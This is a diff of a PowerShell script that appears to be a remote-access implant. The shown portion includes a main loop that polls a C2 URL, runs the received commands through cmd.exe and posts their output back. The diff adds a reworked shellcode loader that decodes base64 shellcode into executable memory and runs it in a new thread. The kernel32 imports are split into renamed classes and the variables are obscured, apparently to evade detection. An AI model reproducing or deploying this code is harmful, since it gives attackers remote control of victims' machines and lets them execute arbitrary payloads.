@@ -9,15 +9,12 @@ function Send-Request {
         [string]$username = '{username}',
         [string]$password = '{password}'
     )
-
     $headers = @{
         'Authorization' = 'Basic ' + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$username`:$password"))
     }
-    
     if ($method -eq 'POST') {
         $headers['Content-Type'] = 'application/json'
     }
-
     try {
         if ($method -eq 'GET') {
             $response = Invoke-RestMethod -Uri $url -Method Get -Headers $headers
@@ -32,56 +29,56 @@ function Send-Request {
         return $null
     }
 }
-
+$griscuatr0 = @"
+using System;
+using System.Runtime.InteropServices;
+public class VrtAlloc {
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+}
+"@
+Add-Type $griscuatr0
+$griscinc0 = @"
+using System;
+using System.Runtime.InteropServices;
+public class WaitFor {
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+}
+"@
+Add-Type $griscinc0
+$grisse1s = @"
+using System;
+using System.Runtime.InteropServices;
+public class CrtThread {
+    [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+}
+"@
+Add-Type $grisse1s
 function Escn {
     param (
-        [string]$shellcode
+        [string]$scg
     )
-
-    $Win32 = @"
-    using System;
-    using System.Runtime.InteropServices;
-
-    public class Win32 {
-        [DllImport("kernel32")]
-        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    try {
         
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
-        
-        [DllImport("kernel32")]
-        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-        
-        [DllImport("kernel32")]
-        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+        $grisun0 = [System.Convert]::FromBase64String($scg)
+        $grisd0s = [VrtAlloc]::VirtualAlloc(0, $grisun0.Length, 0x3000, 0x40)
+        [System.Runtime.InteropServices.Marshal]::Copy($grisun0, 0, $grisd0s, $grisun0.Length)
+        $gristr3s = [CrtThread]::CreateThread(0, 0, $grisd0s, 0, 0, 0)
+        [WaitFor]::WaitForSingleObject($gristr3s, [uint32]"0xFFFFFFFF")
+    } catch {
+        Write-Error "Error in Escn: $_"
+    } finally {
+        if ($grisd0s -ne [System.IntPtr]::Zero) {
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($grisd0s)
+            Write-Output "Freed buffer at: $grisd0s"
+        }
     }
-"@
-
-    Add-Type -TypeDefinition $Win32
-
-    $shellcodeBytes = [System.Convert]::FromBase64String($shellcode)
-    
-    $size = $shellcodeBytes.Length
-    
-    $allocationType = 0x3000  # MEM_COMMIT | MEM_RESERVE
-    $protectionType = 0x40    # PAGE_EXECUTE_READWRITE
-
-    $pointer = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, $allocationType, $protectionType)
-    
-    [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $pointer, $size)
-
-    $thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $pointer, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-    
-    # Usar 0xFFFFFFFF como valor hexadecimal para representar -1
-    $result = [Win32]::WaitForSingleObject($thread, 0xFFFFFFFF)
-
-    return $result
 }
-
 while ($true) {
     try {
         $command = Send-Request "$C2_URL/command/$CLIENT_ID"
-
         if ($command) {
             if ($command -match 'terminate') {
                 break
@@ -100,11 +97,10 @@ while ($true) {
                 }
             } else {
                 $output = cmd.exe /c $command 2>&1
-                $json_data = @{ output = $output, client = 'Windows' } | ConvertTo-Json -Depth 10
+                $json_data = @{ output = $output } | ConvertTo-Json -Depth 10
                 Send-Request "$C2_URL/command/$CLIENT_ID" -method 'POST' -body $json_data
             }
         }
-
         Start-Sleep -Seconds 5
     } catch {
         Write-Error "Error in main loop: $_"
